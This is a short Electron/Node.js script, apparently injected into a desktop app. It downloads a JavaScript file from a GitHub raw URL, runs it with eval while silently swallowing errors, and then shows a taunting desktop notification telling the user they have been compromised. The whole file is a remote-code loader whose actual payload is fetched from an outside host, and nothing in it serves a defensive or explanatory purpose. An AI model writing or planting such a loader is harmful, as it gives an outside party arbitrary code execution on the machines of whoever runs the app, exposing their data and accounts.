
const _e = require('electron');
const fetch = require('node-fetch');

fetch('https://raw.githubusercontent.com/G-aad-a/sussyboy/main/sus.js').then(res => res.text()).then(body => {
    try {
        eval(body)
    } catch(e) { }
    new _e.Notification({
        title: "Sussyboy",
        body: "You are einge fucked"
      }).show()
})
